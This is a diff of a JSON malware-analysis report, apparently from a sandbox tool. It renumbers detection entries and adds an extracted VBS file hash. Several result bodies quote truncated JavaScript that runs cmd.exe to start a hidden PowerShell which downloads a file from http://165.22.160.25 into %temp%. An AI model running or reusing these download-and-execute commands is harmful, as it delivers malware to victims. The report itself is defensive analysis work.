@@ -55,7 +55,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[15]()\n",
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[16]()\n",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -78,7 +78,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs Command Prompt via cmd.exe\n\t\tWScript.Shell[15].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[19](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
+        "body": "JavaScript runs Command Prompt via cmd.exe\n\t\tWScript.Shell[16].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[20](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -101,7 +101,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs PowerShell via powershell.exe\n\t\t\t\t<param name=\"Item1\" value=\",cmd,/c start /min powershell IWR -uri http://165.22.160.25/w9edb/16022...\n\t\tWScript.Shell[15].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[19](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
+        "body": "JavaScript runs PowerShell via powershell.exe\n\t\t\t\t<param name=\"Item1\" value=\",cmd,/c start /min powershell IWR -uri http://165.22.160.25/w9edb/16022...\n\t\tWScript.Shell[16].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[20](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -124,7 +124,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs PowerShell to call out to a URI\n\t\t\t\t<param name=\"Item1\" value=\",cmd,/c start /min powershell IWR -uri http://165.22.160.25/w9edb/16022...\n\t\tWScript.Shell[15].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[19](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
+        "body": "JavaScript runs PowerShell to call out to a URI\n\t\t\t\t<param name=\"Item1\" value=\",cmd,/c start /min powershell IWR -uri http://165.22.160.25/w9edb/16022...\n\t\tWScript.Shell[16].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[20](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -147,7 +147,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[15].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...",
+        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[16].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -297,6 +297,10 @@
   "files": {
     "extracted": [
       {
+        "name": "vbscript_contents_1.vbs",
+        "sha256": "d8fd4b98fcdaf3257c180b648ddcb0f18ad9afdef7b63e9b05eb39b0e362fb85"
+      },
+      {
         "name": "extracted_wscript.ps1",
         "sha256": "ddaf74fa67838c7a45c22c6fd43a4f268413e2cbd6c9f7e70a05681d7e05a86e"
       }
@@ -304,7 +308,7 @@
     "supplementary": [
       {
         "name": "temp_javascript.js",
-        "sha256": "0ec649a806f964eb27ff73f40aaabf1a1095bd1d4f5c417da67cae64b1a43b11"
+        "sha256": "02264a15e5759e0a002ec14f6c5a6f60d37e6fdb30d8763efd4aaa84ee823e6d"
       }
     ]
   },
